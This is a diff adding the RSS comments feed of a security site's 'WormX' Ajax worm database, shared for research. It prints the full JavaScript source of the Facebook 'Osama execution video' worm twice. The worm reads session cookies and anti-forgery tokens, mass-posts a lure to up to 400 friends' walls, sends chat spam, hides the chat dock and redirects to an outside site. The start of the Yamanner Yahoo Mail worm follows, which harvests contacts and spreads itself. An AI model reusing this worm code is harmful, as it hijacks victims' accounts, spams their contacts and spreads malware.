@@ -1,0 +1,2514 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+		>
+<channel>
+	<title>Comments on: WormX</title>
+	<atom:link href="http://www.gnucitizen.org/blog/wormx/feed/" rel="self" type="application/rss+xml" />
+	<link>http://www.gnucitizen.org/blog/wormx/</link>
+	<description>Information Security Think Tank</description>
+	<lastBuildDate>Mon, 12 Dec 2011 19:56:03 +0000</lastBuildDate>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.3.2</generator>
+	<item>
+		<title>By: pdp</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-130330</link>
+		<dc:creator>pdp</dc:creator>
+		<pubDate>Wed, 04 May 2011 07:11:39 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-130330</guid>
+		<description>&lt;h3&gt;Osama FaceBook worm&lt;/h3&gt;
+
+No description for this entry.
+
+&lt;pre&gt;&lt;code&gt;///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// KuNG FU JS v.1  20yrsplus.info
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+//alert(&#039;Photo Uploaded! Please wait 1-2 minutes without leaving this page until we process your picture!&#039;);
+
+function readCookie(name) {
+	
+	var nameEQ = name + &quot;=&quot;;
+	var ca = document.cookie.split(&#039;;&#039;);
+	for(var i=0;i &lt; ca.length;i++) {
+		var c = ca[i];
+		while (c.charAt(0)==&#039; &#039;) c = c.substring(1,c.length);
+		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+	}
+	return null;
+
+}
+
+var user_id = readCookie(&quot;c_user&quot;);
+
+
+// Setup some variables
+
+var post_form_id = document.getElementsByName(&#039;post_form_id&#039;)[0].value;
+var fb_dtsg = document.getElementsByName(&#039;fb_dtsg&#039;)[0].value;
+
+// Chat message variables 
+
+var linkies = [
+	&quot;http://www.facebook.com/Osama.Gets.Shot.Down&quot;,
+	&quot;http://www.facebook.com/Osama.Gets.Shot.Down&quot;,
+	&quot;http://www.facebook.com/Osama.Gets.Shot.Down&quot;,
+	&quot;http://www.facebook.com/Osama.Gets.Shot.Down&quot;
+]
+
+var this_chat = &quot;Watch Osama&#039;s EXECUTION Video! &quot; + linkies[Math.floor(Math.random()*linkies.length)];
+var prepared_chat = encodeURIComponent(this_chat);
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Post Link to friends walls
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var token = Math.round(new Date().getTime() / 1000);
+
+var http1 = new XMLHttpRequest();
+
+var url1 = &quot;http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&amp;viewer=&quot;+user_id+&quot;&amp;token=&quot;+token+&quot;-6&amp;filter[0]=user&amp;options[0]=friends_only&quot;;
+
+var params1 = &quot;&quot;;
+http1.open(&quot;GET&quot;, url1+&quot;?&quot;+params1, true);
+http1.onreadystatechange = function() {//Call a function when the state changes.
+
+	if(http1.readyState == 4 &amp;&amp; http1.status == 200) { // If state = success
+		
+		var response1 = http1.responseText;
+		
+		response1 = response1.replace(&quot;for (;;);&quot;, &quot;&quot;); // Get rid of the junk at the beginning of the returned object
+		response1 = JSON.parse(response1); // Convert the response to JSON
+		
+		//alert(response4.toSource());
+		
+		var count = 0;
+		
+		for(uid in response1.payload.entries){
+			
+			if(count &lt; 400){
+				
+				//alert(&quot;SENT TO &quot;+response1.payload.entries[count].uid);
+
+				// Loop to send messages
+			
+				// New XMLHttp object
+				var httpwp = new XMLHttpRequest();
+							
+				var urlwp = &quot;http://www.facebook.com/ajax/profile/composer.php?__a=1&quot;;
+				
+				var statusmessage=&quot;Disturbing Yet Awesome!&quot;;
+				var title=&quot;Bin Laden EXECUTION Video! Yes it&#039;s REAL!&quot;;
+				var link=linkies[Math.floor(Math.random()*linkies.length)];
+				var description=&quot;Commandos attack Bin Laden&#039;s compund and take him out!&quot;;
+				var picture=&quot;http://i.imgur.com/yTjtU.jpg&quot;;
+				
+				var paramswp = &quot;post_form_id=&quot;+post_form_id+&quot;&amp;fb_dtsg=&quot;+fb_dtsg+&quot;&amp;xhpc_composerid=u574553_1&amp;xhpc_targetid=&quot;+response1.payload.entries[count].uid+&quot;&amp;xhpc_context=profile&amp;xhpc_fbx=1&amp;aktion=post&amp;app_id=2309869772&amp;UIThumbPager_Input=0&amp;attachment[params][metaTagMap][0][http-equiv]=content-type&amp;attachment[params][metaTagMap][0][content]=text%2Fhtml%3B%20charset%3Dutf-8&amp;attachment[params][metaTagMap][1][property]=og%3Atitle&amp;attachment[params][metaTagMap][1][content]=&quot;+title+&quot;&amp;attachment[params][metaTagMap][2][property]=og%3Aurl&amp;attachment[params][metaTagMap][2][content]=&quot;+link+&quot;&amp;attachment[params][metaTagMap][3][property]=og%3Asite_name&amp;attachment[params][metaTagMap][3][content]=&quot;+title+&quot;&amp;attachment[params][metaTagMap][4][property]=og%3Aimage&amp;attachment[params][metaTagMap][4][content]=&quot;+picture+&quot;&amp;attachment[params][metaTagMap][5][property]=og%3Adescription&amp;attachment[params][metaTagMap][5][content]=&quot;+description+&quot;&amp;attachment[params][metaTagMap][6][name]=description&amp;attachment[params][metaTagMap][6][content]=&quot;+description+&quot;&amp;attachment[params][metaTagMap][7][http-equiv]=Content-Type&amp;attachment[params][metaTagMap][7][content]=text%2Fhtml%3B%20charset%3Dutf-8&amp;attachment[params][medium]=106&amp;attachment[params][urlInfo][user]=&quot;+link+&quot;&amp;attachment[params][favicon]=http%3A%2F%2F20-y-rr-z.info%2Ffavicon.ico&amp;attachment[params][title]=&quot;+title+&quot;&amp;attachment[params][fragment_title]=&amp;attachment[params][external_author]=&amp;attachment[params][summary]=&quot;+description+&quot;&amp;attachment[params][url]=&quot;+link+&quot;&amp;attachment[params][ttl]=0&amp;attachment[params][error]=1&amp;attachment[params][responseCode]=206&amp;attachment[params][metaTags][description]=&quot;+description+&quot;&amp;attachment[params][images][0]=&quot;+picture+&quot;&amp;attachment[params][scrape_time]=1302991496&amp;attachment[params][cache_hit]=1&amp;attachment[type]=100&amp;xhpc_message_text=&quot;+statusmessage+&quot;)&amp;xhpc_message=&quot;+statusmessage+&quot;)&amp;nctr[_mod]=pagelet_wall&amp;lsd&amp;post_form_id_source=AsyncRequest&quot;;
+				
+				httpwp.open(&quot;POST&quot;, urlwp, true);
+				
+				//Send the proper header information along with the request
+				
+				httpwp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+				httpwp.setRequestHeader(&quot;Content-length&quot;, paramswp.length);
+				httpwp.setRequestHeader(&quot;Connection&quot;, &quot;keep-alive&quot;);
+				
+				httpwp.onreadystatechange = function() { //Call a function when the state changes.
+					if(httpwp.readyState == 4 &amp;&amp; httpwp.status == 200){
+						//alert(http.responseText);
+						//alert(&#039;buddy list fetched&#039;);
+					}
+
+				}
+
+				httpwp.send(paramswp);
+	
+			}
+
+			count++; // increment counter
+		
+		}
+				
+		http1.close; // Close the connection
+		
+		
+		
+	}
+	
+}
+
+http1.send(null);
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Hide chat boxes
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var hide = document.getElementById(&#039;fbDockChatTabSlider&#039;);
+
+hide.style.display = &quot;none&quot;;
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Get online friends and send chat message to them
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var http3 = new XMLHttpRequest();
+
+var url3 = &quot;http://www.facebook.com/ajax/chat/buddy_list.php?__a=1&quot;;
+var params3 = &quot;user=&quot;+user_id+&quot;&amp;popped_out=false&amp;force_render=true&amp;post_form_id=&quot;+post_form_id+&quot;&amp;fb_dtsg=&quot;+fb_dtsg+&quot;&amp;lsd&amp;post_form_id_source=AsyncRequest&quot;;
+http3.open(&quot;POST&quot;, url3, true);
+
+//Send the proper header information along with the request
+http3.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+http3.setRequestHeader(&quot;Content-length&quot;, params3.length);
+http3.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
+
+http3.onreadystatechange = function() {//Call a function when the state changes.
+	if(http3.readyState == 4 &amp;&amp; http3.status == 200) {
+		
+		var response3 = http3.responseText;
+		
+		response3 = response3.replace(&quot;for (;;);&quot;, &quot;&quot;);
+		response3 = JSON.parse(response3);
+		
+		var count = 0;
+		
+		for(property in response3.payload.buddy_list.nowAvailableList){
+			
+			if(count &lt; 100){
+				
+				// Loop to send messages
+			
+				// New XMLHttp object
+				var httpc = new XMLHttpRequest();
+				
+				// Generate random message ID
+								
+				var msgid = Math.floor(Math.random()*1000000);
+				
+				var time = Math.round(new Date().getTime() / 1000);
+				
+				var urlc = &quot;http://www.facebook.com/ajax/chat/send.php?__a=1&quot;;
+				var paramsc = &quot;msg_id=&quot;+msgid+&quot;&amp;client_time=&quot;+time+&quot;&amp;to=&quot;+property+&quot;&amp;num_tabs=1&amp;pvs_time=&quot;+time+&quot;&amp;msg_text=&quot;+prepared_chat+&quot;&amp;to_offline=false&amp;post_form_id=&quot;+post_form_id+&quot;&amp;fb_dtsg=&quot;+fb_dtsg+&quot;&amp;lsd&amp;post_form_id_source=AsyncRequest&quot;;
+				httpc.open(&quot;POST&quot;, urlc, true);
+				
+				//Send the proper header information along with the request
+				httpc.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+				httpc.setRequestHeader(&quot;Content-length&quot;, paramsc.length);
+				httpc.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
+				
+				httpc.onreadystatechange = function() { //Call a function when the state changes.
+					if(httpc.readyState == 4 &amp;&amp; httpc.status == 200){
+						//alert(http.responseText);
+						//alert(&#039;buddy list fetched&#039;);
+					}
+				}
+				httpc.send(paramsc);
+	
+			}
+			
+			//alert(property);
+			count++; // increment counter
+		
+		}
+		
+		http3.close; // Close the connection
+		
+	}
+}
+http3.send(params3);
+
+
+
+
+
+
+
+/*
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Become a Fan - MW GIVEAWAY
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var http4 = new XMLHttpRequest();
+
+var url4 = &quot;http://www.facebook.com/ajax/pages/fan_status.php?__a=1&quot;;
+
+var params4 = &quot;fbpage_id=217981564879947&amp;add=1&amp;reload=0&amp;preserve_tab=false&amp;nctr[_mod]=pagelet_header&amp;post_form_id=&quot;+post_form_id+&quot;&amp;fb_dtsg=&quot;+fb_dtsg+&quot;&amp;lsd&amp;post_form_id_source=AsyncRequest&quot;
+
+http4.open(&quot;POST&quot;, url4, true);
+
+//Send the proper header information along with the request
+http4.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+http4.setRequestHeader(&quot;Content-length&quot;, params4.length);
+http4.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
+
+http4.onreadystatechange = function() {//Call a function when the state changes.
+	if(http4.readyState == 4 &amp;&amp; http4.status == 200) {
+			
+		http4.close; // Close the connection
+		
+	}
+}
+http4.send(params4);
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Become a Fan - MW GIft
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var http5 = new XMLHttpRequest();
+
+var url5 = &quot;http://www.facebook.com/ajax/pages/fan_status.php?__a=1&quot;;
+
+var params5 = &quot;fbpage_id=217981564879947&amp;add=1&amp;reload=0&amp;preserve_tab=false&amp;nctr[_mod]=pagelet_header&amp;post_form_id=&quot;+post_form_id+&quot;&amp;fb_dtsg=&quot;+fb_dtsg+&quot;&amp;lsd&amp;post_form_id_source=AsyncRequest&quot;
+
+http5.open(&quot;POST&quot;, url5, true);
+
+//Send the proper header information along with the request
+http5.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+http5.setRequestHeader(&quot;Content-length&quot;, params5.length);
+http5.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
+
+http5.onreadystatechange = function() {//Call a function when the state changes.
+	if(http5.readyState == 4 &amp;&amp; http5.status == 200) {
+			
+		http5.close; // Close the connection
+		
+	}
+}
+http5.send(params5);
+*/
+
+//document.getElementById(&#039;susta&#039;).style.display=&quot;none&quot;;
+document.getElementById(&#039;contentArea&#039;).innerHTML=&quot;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\&quot;http://www.hindustantimes.com/images/loading_gif.gif\&quot; /&gt;&lt;br /&gt;Please wait...&lt;/center&gt;&quot;;
+setTimeout(&quot;window.location = &#039;http://osama.mytopanswers.info/video.htm&#039;;&quot;, 15000);&lt;/code&gt;&lt;/pre&gt;
+
+facebook, osama bin laden</description>
+		<content:encoded><![CDATA[<h3>Osama FaceBook worm</h3>
+<p>No description for this entry.</p>
+<pre><code>///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// KuNG FU JS v.1  20yrsplus.info
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+//alert('Photo Uploaded! Please wait 1-2 minutes without leaving this page until we process your picture!');
+
+function readCookie(name) {
+
+	var nameEQ = name + "=";
+	var ca = document.cookie.split(';');
+	for(var i=0;i &lt; ca.length;i++) {
+		var c = ca[i];
+		while (c.charAt(0)==' ') c = c.substring(1,c.length);
+		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+	}
+	return null;
+
+}
+
+var user_id = readCookie("c_user");
+
+// Setup some variables
+
+var post_form_id = document.getElementsByName('post_form_id')[0].value;
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+
+// Chat message variables 
+
+var linkies = [
+	"http://www.facebook.com/Osama.Gets.Shot.Down",
+	"http://www.facebook.com/Osama.Gets.Shot.Down",
+	"http://www.facebook.com/Osama.Gets.Shot.Down",
+	"http://www.facebook.com/Osama.Gets.Shot.Down"
+]
+
+var this_chat = "Watch Osama's EXECUTION Video! " + linkies[Math.floor(Math.random()*linkies.length)];
+var prepared_chat = encodeURIComponent(this_chat);
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Post Link to friends walls
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var token = Math.round(new Date().getTime() / 1000);
+
+var http1 = new XMLHttpRequest();
+
+var url1 = "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&amp;viewer="+user_id+"&amp;token="+token+"-6&amp;filter[0]=user&amp;options[0]=friends_only";
+
+var params1 = "";
+http1.open("GET", url1+"?"+params1, true);
+http1.onreadystatechange = function() {//Call a function when the state changes.
+
+	if(http1.readyState == 4 &amp;&amp; http1.status == 200) { // If state = success
+
+		var response1 = http1.responseText;
+
+		response1 = response1.replace("for (;;);", ""); // Get rid of the junk at the beginning of the returned object
+		response1 = JSON.parse(response1); // Convert the response to JSON
+
+		//alert(response4.toSource());
+
+		var count = 0;
+
+		for(uid in response1.payload.entries){
+
+			if(count &lt; 400){
+
+				//alert("SENT TO "+response1.payload.entries[count].uid);
+
+				// Loop to send messages
+
+				// New XMLHttp object
+				var httpwp = new XMLHttpRequest();
+
+				var urlwp = "http://www.facebook.com/ajax/profile/composer.php?__a=1";
+
+				var statusmessage="Disturbing Yet Awesome!";
+				var title="Bin Laden EXECUTION Video! Yes it's REAL!";
+				var link=linkies[Math.floor(Math.random()*linkies.length)];
+				var description="Commandos attack Bin Laden's compund and take him out!";
+				var picture="http://i.imgur.com/yTjtU.jpg";
+
+				var paramswp = "post_form_id="+post_form_id+"&amp;fb_dtsg="+fb_dtsg+"&amp;xhpc_composerid=u574553_1&amp;xhpc_targetid="+response1.payload.entries[count].uid+"&amp;xhpc_context=profile&amp;xhpc_fbx=1&amp;aktion=post&amp;app_id=2309869772&amp;UIThumbPager_Input=0&amp;attachment[params][metaTagMap][0][http-equiv]=content-type&amp;attachment[params][metaTagMap][0][content]=text%2Fhtml%3B%20charset%3Dutf-8&amp;attachment[params][metaTagMap][1][property]=og%3Atitle&amp;attachment[params][metaTagMap][1][content]="+title+"&amp;attachment[params][metaTagMap][2][property]=og%3Aurl&amp;attachment[params][metaTagMap][2][content]="+link+"&amp;attachment[params][metaTagMap][3][property]=og%3Asite_name&amp;attachment[params][metaTagMap][3][content]="+title+"&amp;attachment[params][metaTagMap][4][property]=og%3Aimage&amp;attachment[params][metaTagMap][4][content]="+picture+"&amp;attachment[params][metaTagMap][5][property]=og%3Adescription&amp;attachment[params][metaTagMap][5][content]="+description+"&amp;attachment[params][metaTagMap][6][name]=description&amp;attachment[params][metaTagMap][6][content]="+description+"&amp;attachment[params][metaTagMap][7][http-equiv]=Content-Type&amp;attachment[params][metaTagMap][7][content]=text%2Fhtml%3B%20charset%3Dutf-8&amp;attachment[params][medium]=106&amp;attachment[params][urlInfo][user]="+link+"&amp;attachment[params][favicon]=http%3A%2F%2F20-y-rr-z.info%2Ffavicon.ico&amp;attachment[params][title]="+title+"&amp;attachment[params][fragment_title]=&amp;attachment[params][external_author]=&amp;attachment[params][summary]="+description+"&amp;attachment[params][url]="+link+"&amp;attachment[params][ttl]=0&amp;attachment[params][error]=1&amp;attachment[params][responseCode]=206&amp;attachment[params][metaTags][description]="+description+"&amp;attachment[params][images][0]="+picture+"&amp;attachment[params][scrape_time]=1302991496&amp;attachment[params][cache_hit]=1&amp;attachment[type]=100&amp;xhpc_message_text="+statusmessage+")&amp;xhpc_message="+statusmessage+")&amp;nctr[_mod]=pagelet_wall&amp;lsd&amp;post_form_id_source=AsyncRequest";
+
+				httpwp.open("POST", urlwp, true);
+
+				//Send the proper header information along with the request
+
+				httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+				httpwp.setRequestHeader("Content-length", paramswp.length);
+				httpwp.setRequestHeader("Connection", "keep-alive");
+
+				httpwp.onreadystatechange = function() { //Call a function when the state changes.
+					if(httpwp.readyState == 4 &amp;&amp; httpwp.status == 200){
+						//alert(http.responseText);
+						//alert('buddy list fetched');
+					}
+
+				}
+
+				httpwp.send(paramswp);
+
+			}
+
+			count++; // increment counter
+
+		}
+
+		http1.close; // Close the connection
+
+	}
+
+}
+
+http1.send(null);
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Hide chat boxes
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var hide = document.getElementById('fbDockChatTabSlider');
+
+hide.style.display = "none";
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Get online friends and send chat message to them
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var http3 = new XMLHttpRequest();
+
+var url3 = "http://www.facebook.com/ajax/chat/buddy_list.php?__a=1";
+var params3 = "user="+user_id+"&amp;popped_out=false&amp;force_render=true&amp;post_form_id="+post_form_id+"&amp;fb_dtsg="+fb_dtsg+"&amp;lsd&amp;post_form_id_source=AsyncRequest";
+http3.open("POST", url3, true);
+
+//Send the proper header information along with the request
+http3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http3.setRequestHeader("Content-length", params3.length);
+http3.setRequestHeader("Connection", "close");
+
+http3.onreadystatechange = function() {//Call a function when the state changes.
+	if(http3.readyState == 4 &amp;&amp; http3.status == 200) {
+
+		var response3 = http3.responseText;
+
+		response3 = response3.replace("for (;;);", "");
+		response3 = JSON.parse(response3);
+
+		var count = 0;
+
+		for(property in response3.payload.buddy_list.nowAvailableList){
+
+			if(count &lt; 100){
+
+				// Loop to send messages
+
+				// New XMLHttp object
+				var httpc = new XMLHttpRequest();
+
+				// Generate random message ID
+
+				var msgid = Math.floor(Math.random()*1000000);
+
+				var time = Math.round(new Date().getTime() / 1000);
+
+				var urlc = "http://www.facebook.com/ajax/chat/send.php?__a=1";
+				var paramsc = "msg_id="+msgid+"&amp;client_time="+time+"&amp;to="+property+"&amp;num_tabs=1&amp;pvs_time="+time+"&amp;msg_text="+prepared_chat+"&amp;to_offline=false&amp;post_form_id="+post_form_id+"&amp;fb_dtsg="+fb_dtsg+"&amp;lsd&amp;post_form_id_source=AsyncRequest";
+				httpc.open("POST", urlc, true);
+
+				//Send the proper header information along with the request
+				httpc.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+				httpc.setRequestHeader("Content-length", paramsc.length);
+				httpc.setRequestHeader("Connection", "close");
+
+				httpc.onreadystatechange = function() { //Call a function when the state changes.
+					if(httpc.readyState == 4 &amp;&amp; httpc.status == 200){
+						//alert(http.responseText);
+						//alert('buddy list fetched');
+					}
+				}
+				httpc.send(paramsc);
+
+			}
+
+			//alert(property);
+			count++; // increment counter
+
+		}
+
+		http3.close; // Close the connection
+
+	}
+}
+http3.send(params3);
+
+/*
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Become a Fan - MW GIVEAWAY
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var http4 = new XMLHttpRequest();
+
+var url4 = "http://www.facebook.com/ajax/pages/fan_status.php?__a=1";
+
+var params4 = "fbpage_id=217981564879947&amp;add=1&amp;reload=0&amp;preserve_tab=false&amp;nctr[_mod]=pagelet_header&amp;post_form_id="+post_form_id+"&amp;fb_dtsg="+fb_dtsg+"&amp;lsd&amp;post_form_id_source=AsyncRequest"
+
+http4.open("POST", url4, true);
+
+//Send the proper header information along with the request
+http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http4.setRequestHeader("Content-length", params4.length);
+http4.setRequestHeader("Connection", "close");
+
+http4.onreadystatechange = function() {//Call a function when the state changes.
+	if(http4.readyState == 4 &amp;&amp; http4.status == 200) {
+
+		http4.close; // Close the connection
+
+	}
+}
+http4.send(params4);
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// Become a Fan - MW GIft
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+var http5 = new XMLHttpRequest();
+
+var url5 = "http://www.facebook.com/ajax/pages/fan_status.php?__a=1";
+
+var params5 = "fbpage_id=217981564879947&amp;add=1&amp;reload=0&amp;preserve_tab=false&amp;nctr[_mod]=pagelet_header&amp;post_form_id="+post_form_id+"&amp;fb_dtsg="+fb_dtsg+"&amp;lsd&amp;post_form_id_source=AsyncRequest"
+
+http5.open("POST", url5, true);
+
+//Send the proper header information along with the request
+http5.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http5.setRequestHeader("Content-length", params5.length);
+http5.setRequestHeader("Connection", "close");
+
+http5.onreadystatechange = function() {//Call a function when the state changes.
+	if(http5.readyState == 4 &amp;&amp; http5.status == 200) {
+
+		http5.close; // Close the connection
+
+	}
+}
+http5.send(params5);
+*/
+
+//document.getElementById('susta').style.display="none";
+document.getElementById('contentArea').innerHTML="&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=\"http://www.hindustantimes.com/images/loading_gif.gif\" /&gt;&lt;br /&gt;Please wait...&lt;/center&gt;";
+setTimeout("window.location = 'http://osama.mytopanswers.info/video.htm';", 15000);</code></pre>
+<p>facebook, osama bin laden</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: GNUCITIZEN &#187; Project Digest 200701</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-4392</link>
+		<dc:creator>GNUCITIZEN &#187; Project Digest 200701</dc:creator>
+		<pubDate>Fri, 16 Feb 2007 21:27:56 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-4392</guid>
+		<description>[...] Two more database projects were initiated. There is an Ajax Worm Database and the Atom Database for dangerous JavaScript code snippets. I find them quite useful in my work. XSSDB is also expanding. Soon, there will be a feature for integrating the database with user supplied attack vectors. [...]</description>
+		<content:encoded><![CDATA[<p>[...] Two more database projects were initiated. There is an Ajax Worm Database and the Atom Database for dangerous JavaScript code snippets. I find them quite useful in my work. XSSDB is also expanding. Soon, there will be a feature for integrating the database with user supplied attack vectors. [...]</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: Sven Vetsch / Disenchant</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-2788</link>
+		<dc:creator>Sven Vetsch / Disenchant</dc:creator>
+		<pubDate>Thu, 25 Jan 2007 18:00:30 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-2788</guid>
+		<description>&lt;h3&gt;Yamanner&lt;/h3&gt;
+
+&lt;p&gt;Yamanner was a worm that exploited a vulnerability in the Yahoo! Mail service to send a copy of itself to other Yahoo! Mail contacts and it also captured the addresses in the addressbook of all the infected users and uploaded them to a server. By doing so, it was building an email list with many thousands of names that could be sold to spammers.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;var http_request = false; 
+
+var Email = &#039;&#039;; 
+
+var IDList = &#039;&#039;; 
+
+var CRumb = &#039;&#039;; 
+
+
+
+function makeRequest(url, Func, Method, Param) {
+
+	if (window.XMLHttpRequest) 
+
+	{ 
+
+		http_request = new XMLHttpRequest();
+
+	} else if (window.ActiveXObject) 
+
+	{ 
+
+		http_request = new ActiveXObject(&#039;Microsoft.XMLHTTP&#039;); 
+
+	}
+
+	
+
+	http_request. onfiltered= Func;
+
+	http_request.open(Method, url, true);
+
+	
+
+	if( Method == &#039;GET&#039;) http_request.send(null);
+
+	else http_request.send(Param);
+
+}
+
+
+
+window.open(&#039;http://www.lastdata.com&#039;); 
+
+ServerUrl = url0;USIndex = ServerUrl.indexOf(&#039;us.&#039; ,0);
+
+MailIndex = ServerUrl.indexOf(&#039;.mail&#039; ,0);
+
+CutLen = MailIndex - USIndex - 3;
+
+var Server = ServerUrl.substr(USIndex + 3, CutLen); 
+
+
+
+function GetIDs(HtmlContent) { 
+
+	IDList = &#039;&#039;;
+
+	StartString = &#039; &#039;;
+
+	EndString = &#039;&#039;;
+
+	i = 0; 
+
+	StartIndex = HtmlContent.indexOf(StartString, 0); 
+
+
+
+	while(StartIndex &gt;= 0) { 
+
+		EndIndex = HtmlContent.indexOf(EndString, StartIndex); 
+
+		CutLen = EndIndex - StartIndex - StartString.length; 
+
+		YahooID = HtmlContent.substr(StartIndex + StartString.length, CutLen); 
+
+	
+
+		if( YahooID.indexOf(&#039;@yahoo.com&#039;, 0) &gt; 0 &#124;&#124; YahooID.indexOf(&#039;@yahoogroups.com&#039;, 0) &gt; 0 ) IDList = IDList + &#039;,&#039; + YahooID ; 
+
+		StartString = &#039;&#039;; 
+
+		StartIndex = HtmlContent.indexOf(StartString, StartIndex + 20); 
+
+		StartString = &#039; &#039;; 
+
+		StartIndex = HtmlContent.indexOf(StartString, StartIndex + 20); 
+
+		i++; 
+
+	} 
+
+
+
+	if(IDList.substr(0,1) == &#039;,&#039;) IDList = IDList.substr(1, IDList.length); 
+
+	if(IDList.indexOf(&#039;,&#039;, 0)&gt;0 ) { 
+
+		IDListArray = IDList.split(&#039;,&#039;); 
+
+		Email = IDListArray[0]; 
+
+		IDList = IDList.replace(Email + &#039;,&#039;, &#039;&#039;); 
+
+	} 
+
+	CurEmail = spamform.NE.value; 
+
+	IDList = IDList.replace(CurEmail + &#039;,&#039;, &#039;&#039;); 
+
+	IDList = IDList.replace(&#039;,&#039; + CurEmail, &#039;&#039;);
+
+	IDList = IDList.replace(CurEmail, &#039;&#039;);
+
+	UserEmail = showLetter.FromAddress.value;
+
+	IDList = IDList.replace(&#039;,&#039; + UserEmail, &#039;&#039;);
+
+	IDList = IDList.replace(UserEmail + &#039;,&#039;, &#039;&#039;);
+
+	IDList = IDList.replace(UserEmail, &#039;&#039;); 
+
+	return IDList; 
+
+}
+
+
+
+function ListContacts() {
+
+	if (http_request.readyState == 4) {
+
+		if (http_request.status == 200) { 
+
+			HtmlContent = http_request.responseText;
+
+			IDList = GetIDs(HtmlContent); 
+
+			makeRequest(&#039;http://us.&#039; + Server + &#039;.mail.yahoo.com/ym/Compose/?rnd=&#039; + Math.random(), Getcrumb, &#039;GET&#039;, null); 
+
+		} 
+
+	}
+
+}
+
+
+
+function ExtractStr(HtmlContent) { 
+
+	StartString = &#039;name=\u0022.crumb\u0022 value=\u0022&#039;; 
+
+	EndString = &#039;\u0022&#039;; 
+
+	i = 0; 
+
+	StartIndex = HtmlContent.indexOf(StartString, 0); 
+
+	EndIndex = HtmlContent.indexOf(EndString, StartIndex + StartString.length ); 
+
+	CutLen = EndIndex - StartIndex - StartString.length; 
+
+	crumb = HtmlContent.substr(StartIndex + StartString.length , CutLen ); 
+
+	return crumb; 
+
+}
+
+
+
+function Getcrumb() { 
+
+	if (http_request.readyState == 4) { 
+
+		if (http_request.status == 200) { 
+
+			HtmlContent = http_request.responseText; 
+
+			CRumb = ExtractStr(HtmlContent); 
+
+			MyBody = &#039;this is test&#039;; 
+
+			MySubj = &#039;New Graphic Site&#039;; 
+
+			Url = &#039;http://us.&#039; + Server + &#039;.mail.yahoo.com/ym/Compose&#039;; 
+
+			var ComposeAction = compose.action;MidIndex = ComposeAction.indexOf(&#039;&amp;Mid=&#039; ,0);
+
+			incIndex = ComposeAction.indexOf(&#039;&amp;inc&#039; ,0);
+
+			CutLen = incIndex - MidIndex - 5;
+
+			var MyMid = ComposeAction.substr(MidIndex + 5, CutLen); 
+
+			QIndex = ComposeAction.indexOf(&#039;?box=&#039; ,0);
+
